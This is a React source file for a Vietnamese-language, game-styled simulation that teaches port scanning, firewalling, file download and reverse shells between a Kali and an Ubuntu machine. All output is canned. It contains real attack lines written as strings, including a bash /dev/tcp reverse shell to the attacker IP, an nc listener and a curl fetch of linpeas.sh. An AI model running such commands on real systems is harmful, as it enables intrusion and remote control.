import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent, type ReactNode } from 'react';
import SimHow from './SimHow';

type PortState = 'open' | 'closed' | 'filtered';
type Tone = 'normal' | 'good' | 'warn' | 'bad';
type ActivePanel = 'none' | 'kali' | 'target' | 'ufw' | 'both';

interface TermLine {
  prompt?: string;
  cmd?: string;
  text: string;
  tone?: Tone;
}

interface LogEvent {
  time: string;
  msg: string;
  tone: Tone;
}

interface PacketEvent {
  seq: number;
  dir: 'right' | 'left' | 'roundtrip' | 'roundtrip-left' | 'both';
  label: string;
  detail: string;
  tone: 'accent' | 'good' | 'warn' | 'bad';
  kind: 'idle' | 'icmp' | 'scan' | 'http' | 'blocked' | 'refused' | 'download' | 'shell' | 'virus' | 'cmd';
}

interface LabState {
  httpServer: boolean;
  listener443: 'off' | 'listening' | 'connected';
  nginxUp: boolean;
  fwBlock80: boolean;
  targetHasLinpeas: boolean;
  compromised: boolean;
  targetAccessLogs: string[];
  ufwLogs: LogEvent[];
  done: Set<string>;
}

const INITIAL_STATE = (): LabState => ({
  httpServer: false,
  listener443: 'off',
  nginxUp: true,
  fwBlock80: false,
  targetHasLinpeas: false,
  compromised: false,
  targetAccessLogs: ['[boot] sshd(:22), nginx(:80), smbd(:445) đang lắng nghe'],
  ufwLogs: [{ time: '00:00', msg: 'UFW hoạt động: cho phép :22, :80, :445 từ ngoài vào.', tone: 'normal' }],
  done: new Set<string>(),
});

const KALI_CHIPS = [
  { label: 'nmap', cmd: 'nmap -p 22,80,445,81 10.10.14.30' },
  { label: 'curl web', cmd: 'curl -I http://10.10.14.30' },
  { label: 'HTTP :8000', cmd: 'python3 -m http.server 8000' },
  { label: 'nghe :443', cmd: 'nc -lvnp 443' },
];

const SHELL_CHIPS = [
  { label: 'whoami', cmd: 'whoami' },
  { label: 'id', cmd: 'id' },
  { label: 'ls /tmp', cmd: 'ls /tmp' },
  { label: 'phát tán payload', cmd: './encrypt_demo.sh' },
  { label: 'exit', cmd: 'exit' },
];

const TARGET_CHIPS = [
  { label: 'ss -tlnp', cmd: 'ss -tlnp' },
  { label: 'chặn :80', cmd: 'sudo ufw deny 80' },
  { label: 'tải linpeas', cmd: 'curl http://10.10.14.7:8000/linpeas.sh -o /tmp/linpeas.sh' },
  { label: 'reverse shell', cmd: 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1' },
];

const TASKS = [
  { id: 'scan', text: 'Từ Kali quét xem Ubuntu đang mở cổng nào (ở Kali: bấm + nmap)' },
  { id: 'fw', text: 'Thử bật tường lửa chặn Kali vào cổng 80 Ubuntu (ở UFW/Ubuntu: chặn :80 → ở Kali: nmap/curl lại)' },
  { id: 'upload', text: 'Mở web trên Kali để Ubuntu tải file linpeas.sh (ở Kali: HTTP :8000 → ở Ubuntu: tải linpeas)' },
  { id: 'shell', text: 'Mở cổng chờ trên Kali để Ubuntu nối ngược shell về (ở Kali: nghe :443 → ở Ubuntu: reverse shell)' },
];

function port80State(s: LabState): PortState {
  if (s.fwBlock80) return 'filtered';
  return s.nginxUp ? 'open' : 'closed';
}

/** Vẽ sprite pixel mật độ cao kiểu GBA bằng cách gộp các pixel đồng màu theo từng hàng. */
function PixelSprite({
  x,
  y,
  px = 2,
  rows,
  palette,
}: {
  x: number;
  y: number;
  px?: number;
  rows: string[];
  palette: Record<string, string>;
}) {
  const rects: { rx: number; ry: number; rw: number; fill: string }[] = [];
  rows.forEach((row, rIdx) => {
    let col = 0;
    while (col < row.length) {
      const ch = row[col];
      const fill = ch === '.' ? undefined : palette[ch];
      let run = 1;
      while (col + run < row.length && row[col + run] === ch) run++;
      if (fill) {
        rects.push({ rx: x + col * px, ry: y + rIdx * px, rw: run * px, fill });
      }
      col += run;
    }
  });
  return (
    <g>
      {rects.map((r, i) => (
        <rect key={i} x={r.rx} y={r.ry} width={r.rw} height={px} fill={r.fill} />
      ))}
    </g>
  );
}

const TREE_ROWS = [
  '......OOOOOOOO......',
  '....OOLHHHHHHLOO....',
  '...OLHHHHHHHHHHLO...',
  '..OLHHHMMMMMMHHHLO..',
  '.OLHHMMMMMMMMMMHHLO.',
  '.OLHMMMMLLMMMMMMHLO.',
  'OLHMMMMLLLLMMMMMMHLO',
  'OLHMMMMMLLMMMMDDMHLO',
  'OLHMMMMMMMMMMDDDDHLO',
  'OLHHMMMMMMMMDDDDDDLO',
  '.OLDDMMMMMMDDDDDDLO.',
  '.OODDDDDDDDDDDDDDOO.',
  '..OOODDDDDDDDDDOOO..',
  '...OODDDSSSDDDDOO...',
  '....OOOSSSSSSOOO....',
  '......OOBBKBBOO.....',
  '......OOBKKBBOO.....',
  '......OOBBKBBOO.....',
  '.....OOOBBKBBOOO....',
  '....ODDDBBBBBBDO....',
];

const TREE_PAL = {
  O: '#18381c',
  H: '#78d458',
  L: '#98eb74',
  M: '#4ca640',
  D: '#30762c',
  S: '#205220',
  B: '#8c5428',
  K: '#b4743c',
};

const HACKER_ROWS = [
  '....OOOOOOOO....',
  '...OHHHHHHHHO...',
  '..OHHLLLLLLHHO..',
  '..OHDDDDDDDDHO..',
  '.OHDDKKKKKKDDHO.',
  '.OHDKGGKKGGKDHO.',
  '.OHDKEEKKEEKDHO.',
  '..OHDDKKKKDDHO..',
  '..OOHHHHHHHHOO..',
  '.OHHHGGGGGGHHHO.',
  '.OHHDHHHHHHDHHO.',
  '.OSHOOOOOOOOHSO.',
  '..O..OPPPPO..O..',
  '.....OPPPPO.....',
  '.....OP..PO.....',
  '.....OP..PO.....',
  '....OKK..KKO....',
  '....OSS..SSO....',
];

const HACKER_PAL = {
  O: '#141822',
  H: '#2a3448',
  L: '#485a78',
  D: '#1d2434',
  K: '#0b0e14',
  G: '#46e87c',
  E: '#22a652',
  S: '#f0c498',
  P: '#202636',
};

const OFFICER_ROWS = [
  '...OOOOOOOO...',
  '..OBBBBBBBBO..',
  '..OBBYYYYBBO..',
  '..OCCCCCCCCO..',
  '..OHSSSSSSHO..',
  '...OSKSSKSO...',
  '...OSSSSSSO...',
  '..OBBBBBBBBO..',
  '.OBBYYBBYYBBO.',
  '.OSBOOBBBOBSO.',
  '..O..OBBO..O..',
  '.....OBBO.....',
  '....OK..KO....',
];

const OFFICER_PAL = {
  O: '#182030',
  B: '#2858a8',
  C: '#1a3870',
  Y: '#f8d038',
  S: '#f8c898',
  H: '#243c78',
  K: '#141820',
};

const POKEBALL_ROWS = [
  '...OOOOOO...',
  '.OORRRRRROO.',
  'ORRRRWWWRRRO',
  'ORRRRWWWRRRO',
  'ORRRRRRRRRRO',
  'OOOOOWWOOOOO',
  'OOOWWWWWWWOO',
  'OWWWWWWWWWWO',
  'OWWWWWWWWWWO',
  '.OOWWWWWWOO.',
  '...OOOOOO...',
];

const POKEBALL_PAL = {
  O: '#181c28',
  R: '#e4382c',
  W: '#f8f8f4',
};

const FLOWER_ROWS = [
  '..YY..',
  '.YWWY.',
  'YWRRWY',
  '.YWWY.',
  '..GG..',
  '.G..G.',
];

const FLOWER_PAL = {
  Y: '#f8f8f0',
  W: '#ffffff',
  R: '#f05848',
  G: '#3c8c34',
};

const PLANT_ROWS = [
  '...GG..GG...',
  '.GGLLGGLLGG.',
  '.GLLGGGGLLG.',
  '..GGGGGGGG..',
  '...GDDDDG...',
  '...OOOOOO...',
  '...OBBBBO...',
  '....OBBO....',
  '....OOOO....',
];

const PLANT_PAL = {
  G: '#3ca03c',
  L: '#78d458',
  D: '#246828',
  O: '#202838',
  B: '#c87038',
};

interface CrtFrameProps {
  model: string;
  phosphor: 'green' | 'amber' | 'cyan' | 'red';
  statusText: string;
  onClose: () => void;
  showClose?: boolean;
  children: ReactNode;
}

function CrtMonitorFrame({ model, phosphor, statusText, onClose, showClose = true, children }: CrtFrameProps) {
  return (
    <section className={`crt-unit crt-${phosphor}`} aria-label={model}>
      <div className="crt-casing">
        <div className="crt-screen-recess">
          <div className="crt-glass">
            <div className="crt-scanlines" aria-hidden="true" />
            <div className="crt-glare" aria-hidden="true" />
            <div className="crt-content">{children}</div>
          </div>
        </div>
        <footer className="crt-bezel-bar">
          <div className="crt-brand">
            <span className="crt-led" aria-hidden="true" />
            <strong>{model}</strong>
            <span className="crt-status">{statusText}</span>
          </div>
          <div className="crt-vents" aria-hidden="true">
            <i /><i /><i /><i /><i />
          </div>
          <div className="crt-hw-btns">
            {showClose && (
              <button type="button" className="gba-btn gba-btn-sm" onClick={onClose}>
                TẮT CRT [✕]
              </button>
            )}
          </div>
        </footer>
      </div>
    </section>
  );
}

export default function DualMachineLab() {
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [panel, setPanel] = useState<ActivePanel>('none');
  const [unread, setUnread] = useState<{ kali: number; target: number; ufw: number }>({ kali: 0, target: 0, ufw: 0 });

  const [lab, setLab] = useState<LabState>(INITIAL_STATE);
  const [kaliLines, setKaliLines] = useState<TermLine[]>([
    { text: 'KALI-OS v2026 (10.10.14.7). Gõ `help` hoặc bấm phím lệnh bên dưới.' },
  ]);
  const [targetLines, setTargetLines] = useState<TermLine[]>([
    { text: 'UBUNTU SERVER (10.10.14.30). Gõ `help` để xem danh sách lệnh.' },
  ]);
  const [kaliEvents, setKaliEvents] = useState<LogEvent[]>([
    { time: '00:00', msg: 'Trạm Kali sẵn sàng ngoài mạng đích.', tone: 'normal' },
  ]);
  const [targetEvents, setTargetEvents] = useState<LogEvent[]>([
    { time: '00:00', msg: 'sshd(:22), nginx(:80), smbd(:445) đang chạy.', tone: 'normal' },
  ]);
  const [packet, setPacket] = useState<PacketEvent>({
    seq: 0,
    dir: 'both',
    label: 'NHẬT KÝ CHIẾN TRƯỜNG',
    detail: 'Chưa tung chiêu nào! Bấm KALI, UFW hoặc UBUNTU để mở CRT — manh mối và kết quả chiếm quyền sẽ hiện tại đây.',
    tone: 'accent',
    kind: 'idle',
  });
  const [kaliInput, setKaliInput] = useState('');
  const [targetInput, setTargetInput] = useState('');
  const [kaliHist, setKaliHist] = useState<string[]>([]);
  const [targetHist, setTargetHist] = useState<string[]>([]);
  const [kaliHi, setKaliHi] = useState(-1);
  const [targetHi, setTargetHi] = useState(-1);
  const [pulsePorts, setPulsePorts] = useState<number[]>([]);
  const [hackerJumping, setHackerJumping] = useState(false);
  const [remoteCmdText, setRemoteCmdText] = useState<string | null>(null);

  const kaliBoxRef = useRef<HTMLDivElement>(null);
  const targetBoxRef = useRef<HTMLDivElement>(null);
  const kaliInputRef = useRef<HTMLInputElement>(null);
  const targetInputRef = useRef<HTMLInputElement>(null);
  const timersRef = useRef<number[]>([]);

  const clearTimers = () => {
    timersRef.current.forEach((id) => window.clearTimeout(id));
    timersRef.current = [];
  };

  useEffect(() => clearTimers, []);

  useEffect(() => {
    kaliBoxRef.current?.scrollTo({ top: kaliBoxRef.current.scrollHeight });
  }, [kaliLines, panel]);

  useEffect(() => {
    targetBoxRef.current?.scrollTo({ top: targetBoxRef.current.scrollHeight });
  }, [targetLines, panel]);

  useEffect(() => {
    if (!isFullscreen) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    const onKey = (e: globalThis.KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (panel !== 'none') setPanel('none');
        else setIsFullscreen(false);
      }
    };
    window.addEventListener('keydown', onKey);
    return () => {
      document.body.style.overflow = prev;
      window.removeEventListener('keydown', onKey);
    };
  }, [isFullscreen, panel]);

  const nowTag = () => {
    const d = new Date();
    return `${String(d.getMinutes()).padStart(2, '0')}:${String(d.getSeconds()).padStart(2, '0')}`;
  };

  function openNode(node: 'kali' | 'target' | 'ufw') {
    setPanel((cur) => {
      if (cur === 'both' && (node === 'kali' || node === 'target')) return 'both';
      return node;
    });
    setUnread((u) => ({ ...u, [node]: 0 }));
    if (node === 'kali') window.setTimeout(() => kaliInputRef.current?.focus(), 40);
    if (node === 'target') window.setTimeout(() => targetInputRef.current?.focus(), 40);
  }

  function toggleParallel() {
    setPanel((cur) => (cur === 'both' ? 'kali' : 'both'));
    setUnread((u) => ({ ...u, kali: 0, target: 0 }));
  }

  function notifyNode(node: 'kali' | 'target' | 'ufw') {
    if (panel === node || (panel === 'both' && (node === 'kali' || node === 'target'))) return;
    setUnread((u) => ({ ...u, [node]: u[node] + 1 }));
  }

  function pushKaliEvent(msg: string, tone: Tone = 'normal') {
    setKaliEvents((prev) => [...prev.slice(-5), { time: nowTag(), msg, tone }]);
    notifyNode('kali');
  }

  function pushTargetEvent(msg: string, tone: Tone = 'normal') {
    setTargetEvents((prev) => [...prev.slice(-5), { time: nowTag(), msg, tone }]);
    notifyNode('target');
  }

  function pushUfwEvent(msg: string, tone: Tone = 'normal') {
    setLab((s) => ({ ...s, ufwLogs: [...s.ufwLogs.slice(-8), { time: nowTag(), msg, tone }] }));
    notifyNode('ufw');
  }

  function emitPacket(next: Omit<PacketEvent, 'seq'>) {
    setPacket((p) => ({ ...next, seq: p.seq + 1 }));
  }

  function flashPorts(ports: number[]) {
    setPulsePorts(ports);
    window.setTimeout(() => setPulsePorts([]), 950);
  }

  const kaliPrompt = lab.listener443 === 'connected' ? 'www-data@target:~$' : 'kali@lab:~$';
  const targetPrompt = 'www-data@target:~$';

  function toggleFirewall80(block: boolean) {
    setLab((s) => ({ ...s, fwBlock80: block }));
    flashPorts([80]);
    if (block) {
      emitPacket({
        dir: 'both',
        label: 'ĐÃ BẬT UFW DENY :80',
        detail: 'Firewall đã hạ rào chắn và DROP mọi gói từ ngoài vào cổng 80. Quay lại CRT Kali quét nmap/curl để kiểm chứng.',
        tone: 'warn',
        kind: 'idle',
      });
      pushUfwEvent('Rule: DENY IN 80/tcp (đang DROP mọi gói tới cổng 80).', 'warn');
      pushTargetEvent('UFW đã bật quy tắc chặn cổng 80/tcp.', 'warn');
    } else {
      emitPacket({
        dir: 'both',
        label: 'ĐÃ MỞ LẠI UFW :80',
        detail: 'Firewall đã nâng rào chắn, cho phép lưu lượng qua cổng 80 vào máy chủ nginx trên Ubuntu.',
        tone: 'good',
        kind: 'idle',
      });
      pushUfwEvent('Rule: ALLOW IN 80/tcp (đã mở lại cổng 80).', 'good');
      pushTargetEvent('UFW đã mở lại cổng 80/tcp.', 'good');
    }
  }

  function triggerPostShellPayload() {
    clearTimers();
    setHackerJumping(true);
    emitPacket({
      dir: 'right',
      label: 'TUNG PAYLOAD QUA HẦM → UBUNTU!',
      detail: 'Hacker nhảy ăn mừng và bơm script mã hóa mô phỏng qua đường hầm :443 thẳng sang phòng máy Ubuntu!',
      tone: 'bad',
      kind: 'virus',
    });
    const t2 = window.setTimeout(() => {
      setHackerJumping(false);
      setLab((s) => ({ ...s, compromised: true }));
      flashPorts([22, 80, 445]);
      emitPacket({
        dir: 'both',
        label: 'CHIẾN THẮNG! HACKER ĐÃ CHIẾM MÁY!',
        detail:
          'Đường hầm :443 đã thông! Hacker (10.10.14.7) đang điều khiển trực tiếp UBUNTU (10.10.14.30) và kích hoạt màn hình đỏ. Tường lửa chặn chiều vào vô hiệu trước shell nối ngược!',
        tone: 'bad',
        kind: 'idle',
      });
      pushTargetEvent('[CẢNH BÁO ĐỎ] Hệ thống vừa thực thi payload độc hại từ phiên reverse shell :443!', 'bad');
      setTargetLines((prev) => [
        ...prev,
        {
          text: '!!! [ALERT] Phát hiện mã hóa hàng loạt tệp hệ thống từ 10.10.14.7:443 — MÀN HÌNH BÁO ĐỘNG ĐỎ !!!',
          tone: 'bad',
        },
      ]);
      pushKaliEvent('Payload hậu khai thác đã kích hoạt cảnh báo đỏ trên 10.10.14.30!', 'good');
    }, 900);
    timersRef.current.push(t2);
  }

  function runKali(raw: string) {
    const cmd = raw.trim().replace(/\s+/g, ' ');
    if (!cmd) return;
    setKaliHist((h) => [cmd, ...h]);
    setKaliHi(-1);

    if (cmd === 'clear') {
      setKaliLines([]);
      return;
    }

    const addOut = (text: string, tone: Tone = 'normal') =>
      setKaliLines((prev) => [...prev, { prompt: kaliPrompt, cmd, text, tone }]);

    if (lab.listener443 === 'connected') {
      if (cmd === 'exit') {
        setLab((s) => ({ ...s, listener443: 'off' }));
        addOut('Đã đóng phiên reverse shell. Quay lại CRT Kali.', 'warn');
        emitPacket({
          dir: 'both',
          label: 'ĐÃ NGẮT SHELL :443',
          detail: 'Phiên điều khiển từ xa tới Ubuntu đã đóng — Kali quay lại chế độ terminal cục bộ.',
          tone: 'warn',
          kind: 'idle',
        });
        pushKaliEvent('Đã ngắt phiên reverse shell về :443.', 'warn');
        pushTargetEvent('Phiên shell kết nối tới 10.10.14.7:443 đã đóng.', 'warn');
        return;
      }
      const runRemoteShellCmd = (outText: string) => {
        setRemoteCmdText(cmd);
        const tid = window.setTimeout(() => setRemoteCmdText(null), 1150);
        timersRef.current.push(tid);
        flashPorts([22, 80]);
        emitPacket({
          dir: 'roundtrip',
          label: `ĐIỀU KHIỂN QUA HẦM: ${cmd}`,
          detail: `Lệnh '${cmd}' chui qua đường hầm :443 tới Ubuntu, chạy tức thì rồi dội kết quả về CRT Kali!`,
          tone: 'good',
          kind: 'cmd',
        });
        pushTargetEvent(`[remote-shell] 10.10.14.7 vừa chạy: ${cmd}`, 'bad');
        setTargetLines((prev) => [
          ...prev,
          { text: `[remote từ 10.10.14.7] $ ${cmd}`, tone: 'warn' },
        ]);
        return addOut(outText, 'good');
      };

      if (cmd === 'whoami') return runRemoteShellCmd('www-data');
      if (cmd === 'id') return runRemoteShellCmd('uid=33(www-data) gid=33(www-data) groups=33(www-data)');
      if (cmd === 'hostname') return runRemoteShellCmd('target-ubuntu');
      if (cmd.startsWith('ls')) {
        return runRemoteShellCmd(lab.targetHasLinpeas ? 'linpeas.sh\nsess_web.tmp' : 'sess_web.tmp');
      }
      if (cmd === './encrypt_demo.sh' || cmd === 'encrypt' || cmd === 'payload') {
        triggerPostShellPayload();
        return addOut('Đang đẩy script payload mô phỏng qua reverse shell tới 10.10.14.30...', 'good');
      }
      if (cmd === 'help') {
        return addOut('Đang điều khiển shell của 10.10.14.30: thử `whoami`, `id`, `hostname`, `ls /tmp`, `./encrypt_demo.sh`, `exit`.');
      }
      return addOut(`(trong shell mục tiêu) Lệnh "${cmd}" không có trong mẫu thử. Gõ \`help\` hoặc \`exit\`.`, 'warn');
    }

    if (cmd === 'help') {
      return addOut(
        [
          'Các lệnh trên KALI-CRT (10.10.14.7):',
          '  ping -c 2 10.10.14.30            kiểm tra kết nối tới mục tiêu',
          '  nmap -p 22,80,445,81 10.10.14.30    quét cổng mục tiêu (hỗ trợ cả nmap -p-)',
          '  curl -I http://10.10.14.30       gửi yêu cầu HTTP tới cổng 80',
          '  python3 -m http.server 8000      bật máy chủ web phát file linpeas.sh',
          '  nc -lvnp 443                     mở cổng lắng nghe reverse shell',
          '  clear                            xoá màn hình CRT',
        ].join('\n'),
      );
    }

    if (cmd.startsWith('ping') && cmd.includes('10.10.14.30')) {
      emitPacket({
        dir: 'roundtrip',
        label: 'KẾT QUẢ PING',
        detail: 'Xác nhận máy đích 10.10.14.30 đang bật (TTL=64, Linux) và kết nối mạng tới Kali ổn định (0% loss).',
        tone: 'accent',
        kind: 'icmp',
      });
      pushKaliEvent('ICMP tới 10.10.14.30 → nhận Reply.', 'good');
      pushTargetEvent('Nhận ICMP Echo Request từ 10.10.14.7 → trả Reply.', 'normal');
      return addOut(
        'PING 10.10.14.30 (10.10.14.30) 56(84) bytes of data.\n64 bytes from 10.10.14.30: icmp_seq=1 ttl=64 time=0.42 ms\n64 bytes from 10.10.14.30: icmp_seq=2 ttl=64 time=0.39 ms\n2 packets transmitted, 2 received, 0% packet loss',
        'good',
      );
    }

    if (cmd.startsWith('nmap') && cmd.includes('10.10.14.30')) {
      const p80 = port80State(lab);
      const ask81 = cmd.includes('81') || cmd.includes('-p-');
      flashPorts(ask81 ? [22, 80, 81, 445] : [22, 80, 445]);

      const rows = [
        'PORT     STATE    SERVICE',
        '22/tcp   open     ssh',
        `80/tcp   ${p80.padEnd(8)} http`,
        ...(ask81 ? ['81/tcp   closed   hosts2-ns'] : []),
        '445/tcp  open     microsoft-ds',
      ];

      const nmapInsight =
        p80 === 'open'
          ? `Phát hiện Ubuntu mở :22 (SSH), :80 (HTTP web) và :445 (SMB)${ask81 ? '; :81 đang đóng (closed)' : ''}. Có thể kiểm tra tiếp dịch vụ web ở :80.`
          : p80 === 'filtered'
            ? 'Cổng :80 chuyển sang filtered — UFW đã âm thầm drop gói dò cổng; :22 và :445 vẫn mở.'
            : 'Cổng :80 báo closed (gói qua được UFW nhưng dịch vụ nginx đã tắt nên trả RST); :22 và :445 vẫn mở.';

      emitPacket({
        dir: 'roundtrip',
        label: 'RAĐA NMAP: KẾT QUẢ QUÉT',
        detail: nmapInsight,
        tone: p80 === 'open' ? 'accent' : 'warn',
        kind: 'scan',
      });

      pushKaliEvent(`Quét nmap → cổng 80 đang ${p80}.`, p80 === 'open' ? 'good' : 'warn');
      pushUfwEvent(
        `SYN từ Kali: cho qua :22, :445${ask81 ? ', :81' : ''}; cổng :80 → ${p80 === 'filtered' ? 'DROP' : 'ALLOW'}.`,
        p80 === 'filtered' ? 'bad' : 'warn',
      );
      pushTargetEvent(
        `Phát hiện TCP SYN từ Kali tới :22, :80 (${p80}), :445${ask81 ? ', :81' : ''}.`,
        'warn',
      );

      setLab((s) => {
        const nextDone = new Set(s.done);
        nextDone.add('scan');
        if (p80 !== 'open') nextDone.add('fw');
        return { ...s, done: nextDone };
      });

      return addOut(`Starting Nmap 7.95 ( https://nmap.org )\nNmap scan report for 10.10.14.30\n${rows.join('\n')}`, 'good');
    }

    if (cmd.startsWith('curl') && cmd.includes('10.10.14.30')) {
      const p80 = port80State(lab);
      flashPorts([80]);
      if (p80 === 'filtered') {
        emitPacket({
          dir: 'right',
          label: 'KẾT QUẢ CURL :80',
          detail: 'Kết nối bị timeout vì tường lửa UFW đã chặn cổng 80 trước khi gói kịp chạm vào web server Ubuntu.',
          tone: 'bad',
          kind: 'blocked',
        });
        pushKaliEvent('curl :80 hết thời gian chờ (bị UFW chặn).', 'bad');
        pushUfwEvent('DROP: 10.10.14.7 → 10.10.14.30:80 (rule DENY :80).', 'bad');
        pushTargetEvent('UFW chặn kết nối từ Kali vào :80.', 'bad');
        setLab((s) => ({ ...s, done: new Set(s.done).add('fw') }));
        return addOut('curl: (28) Failed to connect to 10.10.14.30 port 80: Connection timed out (bị firewall chặn)', 'bad');
      }
      if (p80 === 'closed') {
        emitPacket({
          dir: 'roundtrip',
          label: 'KẾT QUẢ CURL :80',
          detail: 'Nhận Connection refused (RST): gói vượt qua được UFW, nhưng nginx trên Ubuntu đã ngừng chạy.',
          tone: 'bad',
          kind: 'refused',
        });
        pushKaliEvent('curl :80 bị từ chối kết nối (RST).', 'warn');
        pushTargetEvent('Kali gọi :80 nhưng nginx đang tắt → trả RST.', 'warn');
        setLab((s) => ({ ...s, done: new Set(s.done).add('fw') }));
        return addOut('curl: (7) Failed to connect to 10.10.14.30 port 80: Connection refused (dịch vụ chưa chạy)', 'bad');
      }
      const logLine = `10.10.14.7 - "HEAD / HTTP/1.1" 200 -`;
      emitPacket({
        dir: 'roundtrip',
        label: 'THÔNG TIN TỪ CURL',
        detail: 'Web :80 trả HTTP 200 OK và lộ banner nginx/1.24.0 (Ubuntu); dấu vết truy cập đã lưu trong access.log của đích.',
        tone: 'good',
        kind: 'http',
      });
      pushKaliEvent('Nhận HTTP 200 OK từ nginx (10.10.14.30:80).', 'good');
      pushUfwEvent('ALLOW: 10.10.14.7 → 10.10.14.30:80.', 'good');
      pushTargetEvent(`nginx access.log: ${logLine}`, 'good');
      setLab((s) => ({ ...s, targetAccessLogs: [...s.targetAccessLogs.slice(-4), logLine] }));
      return addOut('HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nContent-Type: text/html; charset=utf-8', 'good');
    }

    if (cmd.includes('http.server') && cmd.includes('8000')) {
      setLab((s) => ({ ...s, httpServer: true }));
      emitPacket({
        dir: 'both',
        label: 'WEB CHIA SẺ :8000 ĐÃ MỞ',
        detail: 'Máy Kali đã mở web phát file linpeas.sh ở cổng :8000 — sang UBUNTU tải file về thôi!',
        tone: 'accent',
        kind: 'idle',
      });
      pushKaliEvent('Mở HTTP server ở :8000 (có linpeas.sh).', 'good');
      return addOut('Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n(Có sẵn: linpeas.sh — sang UBUNTU tải file về!)', 'good');
    }

    if ((cmd.startsWith('nc ') || cmd.startsWith('ncat ')) && cmd.includes('-l') && cmd.includes('443')) {
      setLab((s) => ({ ...s, listener443: 'listening' }));
      emitPacket({
        dir: 'both',
        label: 'CỔNG NGHE :443 ĐANG CANH',
        detail: 'Kali đang mở cổng :443 phục kích sẵn — chỉ cần Ubuntu bắn shell ra là đường hầm lập tức thông!',
        tone: 'accent',
        kind: 'idle',
      });
      pushKaliEvent('Đang lắng nghe trên :443 chờ kết nối ngược.', 'good');
      return addOut('listening on [any] 443 ...\n(Giờ bấm vào máy UBUNTU trên bản đồ để bắn reverse shell về 10.10.14.7:443!)', 'good');
    }

    addOut(`Chưa hỗ trợ lệnh "${cmd}" trong mẫu thử. Gõ \`help\` để xem lệnh.`, 'warn');
  }

  function runTarget(raw: string) {
    const cmd = raw.trim().replace(/\s+/g, ' ');
    if (!cmd) return;
    setTargetHist((h) => [cmd, ...h]);
    setTargetHi(-1);

    if (cmd === 'clear') {
      setTargetLines([]);
      return;
    }

    const addOut = (text: string, tone: Tone = 'normal') =>
      setTargetLines((prev) => [...prev, { prompt: targetPrompt, cmd, text, tone }]);

    if (cmd === 'help') {
      return addOut(
        [
          'Các lệnh trên TARGET-CRT (10.10.14.30):',
          '  whoami / id / ip a             xem user và IP',
          '  ss -tlnp                       xem các cổng đang mở',
          '  ls /tmp                        xem file trong /tmp',
          '  cat /var/log/nginx/access.log  xem log nginx',
          '  sudo ufw deny 80 / allow 80    chặn hoặc mở cổng 80',
          '  sudo systemctl stop nginx      tắt dịch vụ web (hoặc start)',
          '  curl http://10.10.14.7:8000/linpeas.sh -o /tmp/linpeas.sh',
          '  bash -i >& /dev/tcp/10.10.14.7/443 0>&1',
          '  clear                          xoá màn hình CRT',
        ].join('\n'),
      );
    }

    if (cmd === 'whoami') return addOut('www-data');
    if (cmd === 'id') return addOut('uid=33(www-data) gid=33(www-data) groups=33(www-data)');
    if (cmd === 'ip a' || cmd === 'ip addr') {
      return addOut('2: eth0: <BROADCAST,MULTICAST,UP>\n    inet 10.10.14.30/24 brd 10.10.14.255 scope global eth0');
    }

    if (cmd.startsWith('ss')) {
      const list = [
        'State   Recv-Q Send-Q Local Address:Port',
        'LISTEN  0      128    0.0.0.0:22',
        ...(lab.nginxUp ? ['LISTEN  0      511    0.0.0.0:80'] : []),
        'LISTEN  0      50     0.0.0.0:445',
      ];
      return addOut(list.join('\n') + (lab.fwBlock80 ? '\n(UFW đang DROP gói từ ngoài vào cổng 80)' : ''));
    }

    if (cmd.startsWith('ls') && cmd.includes('/tmp')) {
      return addOut(lab.targetHasLinpeas ? 'linpeas.sh  sess_web.tmp' : 'sess_web.tmp');
    }

    if (cmd.includes('access.log')) {
      return addOut(lab.targetAccessLogs.join('\n'));
    }

    if (cmd === 'sudo ufw deny 80') {
      toggleFirewall80(true);
      return addOut('Rule updated: chặn mọi gói vào cổng 80/tcp. Quay lại CRT Kali gõ nmap/curl để kiểm chứng!', 'warn');
    }

    if (cmd === 'sudo ufw allow 80') {
      toggleFirewall80(false);
      return addOut('Rule updated: đã mở lại cổng 80/tcp.', 'good');
    }

    if (cmd === 'sudo systemctl stop nginx') {
      setLab((s) => ({ ...s, nginxUp: false }));
      flashPorts([80]);
      emitPacket({
        dir: 'both',
        label: 'DỊCH VỤ WEB ĐÃ TẮT',
        detail: 'Tiến trình nginx đã dừng lắng nghe cổng 80 — nếu quét từ Kali lúc này cổng :80 sẽ báo closed (RST) chứ không phải filtered.',
        tone: 'warn',
        kind: 'idle',
      });
      pushTargetEvent('systemd: Stopped nginx.service.', 'warn');
      return addOut('Đã tắt nginx. Quay lại Kali quét thử để thấy trạng thái `closed`.', 'warn');
    }

    if (cmd === 'sudo systemctl start nginx') {
      setLab((s) => ({ ...s, nginxUp: true }));
      flashPorts([80]);
      emitPacket({
        dir: 'both',
        label: 'DỊCH VỤ WEB ĐANG CHẠY',
        detail: 'Tiến trình nginx đã lắng nghe lại trên :80 — Kali có thể truy cập web qua cổng này nếu UFW không chặn.',
        tone: 'good',
        kind: 'idle',
      });
      pushTargetEvent('systemd: Started nginx.service.', 'good');
      return addOut('Đã bật lại nginx trên cổng 80.', 'good');
    }

    if (cmd.startsWith('curl') && cmd.includes('10.10.14.7:8000') && cmd.includes('linpeas.sh')) {
      if (!lab.httpServer) {
        emitPacket({
          dir: 'roundtrip-left',
          label: 'TẢI FILE THẤT BẠI',
          detail: 'Ubuntu nhận Connection refused ở :8000 vì trên Kali chưa bật `python3 -m http.server 8000`.',
          tone: 'bad',
          kind: 'refused',
        });
        pushKaliEvent('10.10.14.30 gọi :8000 nhưng chưa mở HTTP server.', 'warn');
        setKaliLines((prev) => [
          ...prev,
          { text: '[mạng] 10.10.14.30 vừa thử tải từ :8000 nhưng bạn chưa bật HTTP server.', tone: 'warn' },
        ]);
        return addOut('curl: (7) Failed to connect to 10.10.14.7 port 8000: Connection refused\n(Bấm sang KALI chạy `python3 -m http.server 8000` trước!)', 'bad');
      }
      setLab((s) => {
        const nextDone = new Set(s.done);
        nextDone.add('upload');
        return { ...s, targetHasLinpeas: true, done: nextDone };
      });
      emitPacket({
        dir: 'right',
        label: 'ĐÃ TẢI LINPEAS.SH',
        detail: 'Ubuntu đã tải xong file linpeas.sh (842 KB) từ máy Kali (:8000) và lưu tại /tmp/linpeas.sh!',
        tone: 'good',
